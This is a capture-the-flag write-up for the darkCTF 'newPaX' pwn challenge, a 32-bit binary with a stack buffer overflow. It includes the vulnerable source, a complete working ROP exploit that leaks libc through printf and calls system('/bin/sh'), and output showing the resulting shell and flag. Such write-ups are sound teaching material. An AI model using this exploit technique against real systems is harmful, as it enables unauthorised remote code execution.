## Pwn/newPaX
gr4n173

*Even though Solar Designer gave you his times technique, you have to resolve(sort-out) yourself and go deeper. This time rope willn't let you have anything you want but you have to make a fake rope and get everything.*

`nc pwn.darkarmy.xyz 5001`

File: `newPaX`

This challenge was quickly solved with [`pwnscripts`](https://github.com/152334H/pwnscripts)
## Solving
I honestly have no idea what the difference is supposed to be between this challenge and `roprop`. Considering I used the *exact same* exploit for both, I'm guessing a missed a `win()` function somewhere in one of the two binaries.

That aside, let's have a look at the source code:
```c
ssize_t vuln() {
  char buf[0x30]; // [esp+8h] [ebp-30h]
  return read(0, buf, 0xC8u);
}
int main() {
  nvm_init();
  nvm_timeout();
  vuln();
  return 0;
}
```
Again, PIE is disabled:
```python
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
The challenge is 32-bit this time. Which is even more confusing, because this just makes it easier to do what I did in `roprop`:
```python
from pwnscripts import *
context.binary = 'newPaX'
GOT_FUNCS = ['__libc_start_main', 'setvbuf']
DIST = 0x34

p = remote('pwn.darkarmy.xyz', 5001)

r = ROP(context.binary)
r.raw(DIST*b'\0')
r.printf(context.binary.got['__libc_start_main'])    # this will print all three since x32
r.main()
p.sendline(r.chain())

libc_leaks = dict((s,extract_first_bytes(p.recv(4),4)) for s in GOT_FUNCS)
context.libc_database = 'libc-database'
context.libc = context.libc_database.libc_find(libc_leaks)

r = ROP(context.binary)
r.raw(DIST*b'\0')
r.call(context.libc.symbols['system'], [context.libc.symbols['str_bin_sh']])
p.sendline(r.chain())
p.interactive()
```
There's basically no change in the code for this and `roprop`. Strange...
```bash
[+] Opening connection to pwn.darkarmy.xyz on port 5001: Done
[*] Loaded 10 cached gadgets for 'newPaX'
[*] found libc! id: libc6-i386_2.27-3ubuntu1.2_amd64
[*] Switching to interactive mode
$ ls
bin
dev
flag.txt
lib
lib32
lib64
newPaX
$ cat flag.txt
darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
```
But whatever, we get the flag. And apparently we were supposed to use `ret2dlresolve` or something. Even more strange.
